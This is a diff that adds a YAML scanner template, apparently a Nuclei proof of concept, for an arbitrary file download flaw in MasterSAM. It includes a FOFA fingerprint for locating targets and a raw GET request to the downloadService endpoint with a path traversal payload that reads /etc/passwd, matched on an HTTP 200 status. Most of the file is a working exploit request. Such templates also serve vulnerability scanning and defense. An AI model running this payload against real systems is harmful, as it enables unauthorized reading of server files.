@@ -1,0 +1,21 @@
+id: poc-tev4tshzdgpo0330
+info:
+  name: MasterSAM存在任意文件下载漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tev4tshzdgpo0330'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tev4tshzdgpo0330
+    fofa: icon_hash="-2145752394"
+http:
+- raw:
+  - 'GET /adama/adama/downloadService?type=1&file=../../../../../etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
